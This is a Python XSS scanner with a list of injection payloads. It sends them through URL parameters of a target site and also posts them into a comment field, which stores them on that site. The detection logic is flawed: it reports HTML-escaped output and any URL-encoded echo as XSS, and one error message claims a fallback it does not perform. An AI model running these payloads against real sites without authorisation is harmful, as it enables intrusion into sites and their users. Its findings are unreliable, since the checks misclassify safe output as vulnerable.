import requests
import urllib.parse
import re

# Expanded XSS Payloads (Encoded, Unencoded, and Obfuscated)
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "\" onmouseover=\"alert('XSS')",
    "'><script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg/onload=alert('XSS')>",
    "<body onload=alert('XSS')>",
    "javascript:alert('XSS')",
    "'; alert(String.fromCharCode(88,83,83)) //",
    "<iframe src=javascript:alert('XSS')>",
    "%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E",  # URL-encoded variant
    "document.write('<script>alert(\"XSS\")</script>');",
    "eval('alert(\"XSS\")');",
    "setTimeout('alert(\"XSS\")', 1000);",
    "location.href='javascript:alert(\"XSS\")';"
]

def detect_reflected_xss(url):
    """Tests for Reflected XSS by injecting payloads into detected parameters."""
    results = []
    
    try:
        response = requests.get(url, timeout=10)
        response_text = response.text.lower()

        # Extract form input parameters dynamically
        input_names = re.findall(r'<input.*?name=["\'](.*?)["\']', response_text)
        if not input_names:
            input_names = ["query", "search", "input"]  # Common fallback parameters

    except requests.exceptions.RequestException:
        return ["[!] Error: Unable to retrieve form inputs. Using default test parameter."]

    for payload in XSS_PAYLOADS:
        encoded_payload = urllib.parse.quote(payload)  # URL encode payloads

        for param in input_names:
            test_url = f"{url}?{param}={encoded_payload}"

            try:
                response = requests.get(test_url, timeout=10)
                response_text = response.text.lower()

                # Detect **Reflected XSS** if payload appears unescaped
                if (payload.lower() in response_text or 
                    urllib.parse.unquote(payload).lower() in response_text or
                    payload.replace("<", "&lt;").replace(">", "&gt;") in response_text):
                    results.append(f"[!] Reflected XSS detected via `{param}` with payload: {payload}")

            except requests.exceptions.RequestException:
                continue

    if not results:
        results.append("[+] No reflected XSS detected.")

    return results


def detect_stored_xss(url):
    """Tests for Stored XSS by submitting payloads and checking if they persist."""
    results = []

    for payload in XSS_PAYLOADS:
        data = {"comment": payload}  # Assuming a common field `comment`

        try:
            # Submit XSS payload to the target
            requests.post(url, data=data, timeout=10)
            response = requests.get(url, timeout=10)

            # Check if the stored payload is reflected back in the response
            if payload.lower() in response.text.lower():
                results.append(f"[!] Stored XSS detected with payload: {payload}")

        except requests.exceptions.RequestException:
            continue

    if not results:
        results.append("[+] No stored XSS detected.")

    return results


def detect_dom_xss(url):
    """Tests for DOM-Based XSS by injecting payloads and checking JavaScript context changes."""
    results = []
    
    # Step 1: Attempt to identify script-based vulnerabilities
    try:
        response = requests.get(url, timeout=10)
        response_text = response.text.lower()

        # Check for potential dangerous JavaScript functions
        dom_sinks = ["document.write", "eval", "innerHTML", "setTimeout", "setInterval", "location.href"]
        for sink in dom_sinks:
            if sink in response_text:
                results.append(f"[!] Potential DOM-Based XSS vulnerability: {sink} found in page source.")

    except requests.exceptions.RequestException:
        return ["[!] Error: Unable to analyze JavaScript sources."]

    # Step 2: Inject DOM-based XSS payloads
    for payload in XSS_PAYLOADS:
        encoded_payload = urllib.parse.quote(payload)  # Ensure payload encoding
        test_url = f"{url}?next={encoded_payload}"

        try:
            response = requests.get(test_url, timeout=10)
            response_text = response.text.lower()

            # Check if payload appears unfiltered in the response (indicating potential execution)
            if payload.lower() in response_text or urllib.parse.quote(payload).lower() in response_text:
                results.append(f"[!] DOM-Based XSS detected with payload: {payload}")

        except requests.exceptions.RequestException:
            continue  # Skip if request fails

    if not results:
        results.append("[+] No DOM-Based XSS detected.")

    return results